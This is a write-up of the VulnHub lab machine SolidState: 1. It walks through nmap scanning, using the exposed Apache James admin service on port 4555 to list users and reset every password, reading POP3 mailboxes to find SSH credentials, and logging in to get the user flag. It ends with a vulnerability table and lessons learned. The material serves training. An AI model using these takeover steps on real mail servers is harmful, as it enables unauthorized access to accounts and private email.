# SolidState: 1

- **Machine:** SolidState: 1
- **Download:** https://www.vulnhub.com/entry/solidstate-1,261/

![](806-1.png)

---

# Machine Setup

1. Extract the downloaded archive.
2. Create a new virtual machine in VirtualBox.
3. Attach the provided **VMDK** file to the **IDE Controller**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the target machine on the local network.

```bash
nmap -sn 192.168.2.0/24
```

![](806-2.png)

---

## Full Nmap Scan

Perform a complete service, version, script, OS detection, and port scan.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.237
```

![](806-3.png)

---

## Optional Enumeration

Scan every TCP port.

```bash
nmap -v -p- 192.168.2.237
```

Run a standard service detection scan.

```bash
nmap -sC -sV -A 192.168.2.237
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.237
```

![](806-4.png)

---

# Web Enumeration

Browse the web application.

```text
http://192.168.2.237/
```

No useful information is immediately exposed through the web interface.

---

# James Mail Server Enumeration

The Nmap scan reveals that **Apache James** is running and exposes its administration service on port **4555**.

Connect to the administration interface.

```bash
nc 192.168.2.237 4555
```

---

## Enumerate Mail Users

List all configured users.

```text
listusers
```

![](806-5.png)

Discovered users:

```text
james
thomas
john
mindy
mailadmin
```

---

## Reset User Passwords

The administration interface allows password modification.

```text
setpassword james 1234
```

```text
setpassword thomas 1234
```

```text
setpassword john 1234
```

```text
setpassword mindy 1234
```

```text
setpassword mailadmin 1234
```

![](806-6.png)

---

# POP3 Mail Enumeration

Connect to the POP3 service.

```bash
telnet 192.168.2.237 110
```

Login as **john**.

```text
USER john
```

```text
PASS 1234
```

![](806-7.png)

---

## List Available Messages

```text
LIST
```

![](806-8.png)

Retrieve the first email.

```text
RETR 1
```

![](806-9.png)

The email contains information pointing toward the **mindy** account.

---

## Access Mindy's Mailbox

Open another POP3 session.

```bash
telnet 192.168.2.237 110
```

Authenticate as **mindy**.

```text
USER mindy
```

```text
PASS 1234
```

List available messages.

```text
LIST
```

![](806-10.png)

Retrieve all messages.

```text
RETR 1
```

```text
RETR 2
```

![](806-11.png)

One of the emails contains Mindy's SSH credentials.

Recovered credentials:

```text
Username : mindy
Password : P@55W0rd1!2@
```

---

# SSH Access

Login using the recovered credentials.

```bash
ssh mindy@192.168.2.237
```

```text
Username : mindy
Password : P@55W0rd1!2@
```

![](806-12.png)

---

## User Enumeration

List the contents of the home directory.

```bash
ls
```

Display the user flag.

```bash
cat user.txt
```

![](806-13.png)

Successfully obtained the user flag.

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Exposed Apache James administration interface | Unauthorized administrative access |
| 2 | Password reset functionality without proper protection | Complete compromise of mail accounts |
| 3 | Accessible POP3 mailboxes | Disclosure of sensitive emails |
| 4 | Credentials stored in email | SSH account compromise |

---

# Key Learning

- Nmap service detection can reveal overlooked administration interfaces.
- Apache James administration services should never be exposed without proper access controls.
- Administrative password reset functionality can completely compromise all user accounts.
- Mailboxes often contain sensitive information such as passwords and internal communications.
- Credential reuse between email and SSH services can quickly lead to system compromise.

---

# Summary

The assessment began with a full Nmap scan, which identified an exposed **Apache James** administration service on port **4555**. By connecting to the service, all configured mail users were enumerated, and their passwords were reset using the available administrative commands. The updated credentials were then used to access user mailboxes through the POP3 service, where sensitive emails revealed SSH credentials for the **mindy** account. These credentials provided direct SSH access to the target system, allowing successful user-level compromise and retrieval of the user flag.